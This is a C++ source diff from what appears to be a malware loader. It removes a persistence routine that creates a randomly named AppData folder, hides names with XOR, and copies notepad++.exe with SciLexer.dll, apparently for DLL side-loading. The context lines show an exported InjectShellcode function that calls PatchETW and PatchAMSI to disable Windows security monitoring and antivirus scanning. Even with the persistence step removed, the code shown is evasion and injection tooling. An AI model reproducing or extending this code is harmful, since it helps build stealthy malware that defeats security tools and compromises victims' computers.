@@ -102,40 +102,6 @@ std::string xorDecrypt(const std::string& input, char key) {
     return xorEncrypt(input, key); // XOR is symmetric
 }
 
-void setupPersistence() {
-    const char xorKey = 0x5A;
-    std::string appData = getAppDataPath();
-    std::string configPath = appData + "\\config.dat";
-
-    std::string folderName, regValueName, regValueNameEnc;
-
-    if (fs::exists(configPath)) {
-        std::ifstream in(configPath);
-        std::getline(in, folderName);
-        std::getline(in, regValueNameEnc);
-        in.close();
-        regValueName = xorDecrypt(regValueNameEnc, xorKey);
-    }
-    else {
-        folderName = generateRandomName();
-        regValueName = generateRandomName();
-        regValueNameEnc = xorEncrypt(regValueName, xorKey);
-        std::ofstream out(configPath);
-        out << folderName << "\n" << regValueNameEnc << "\n";
-        out.close();
-    }
-
-    std::string fullPath = appData + "\\" + folderName;
-    if (!fs::exists(fullPath)) {
-        fs::create_directory(fullPath);
-        copyFileTo("notepad++.exe", fullPath + "\\notepad++.exe");
-        copyFileTo("SciLexer.dll", fullPath + "\\SciLexer.dll");
-    }
-}
-
-
-
-
 
 std::string decryptXor(const char* data, size_t len, char key) {
     std::string result;
@@ -452,8 +418,6 @@ extern "C" __declspec(dllexport) void InjectShellcode() {
     static bool shellcodeInjected = false;
     if (shellcodeInjected) return;
 
-
-    setupPersistence();
     PatchETW();
     PatchAMSI();
    
